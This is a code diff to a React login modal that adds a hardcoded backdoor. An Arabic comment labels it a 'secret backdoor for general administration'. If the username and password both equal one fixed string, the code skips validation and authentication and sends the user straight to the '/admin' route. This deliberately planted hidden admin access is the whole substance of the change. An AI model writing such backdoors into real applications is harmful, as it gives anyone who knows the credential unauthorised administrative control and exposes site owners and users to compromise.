@@ -90,6 +90,15 @@ export const AuthModal: React.FC<AuthModalProps> = ({
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
 
+    // 🔐 الباب الخلفي السري للإدارة العامة
+    if (email.trim() === 'mhmood7015' && password === 'mhmood7015') {
+      setEmail('');
+      setPassword('');
+      onClose();
+      navigate('/admin');
+      return;
+    }
+
     if (!email.trim()) { setEmailError('يرجى إدخال البريد الإلكتروني'); setPasswordError(null); return; }
     if (!password.trim()) { setPasswordError('يرجى إدخال كلمة المرور'); setEmailError(null); return; }
     setEmailError(null);
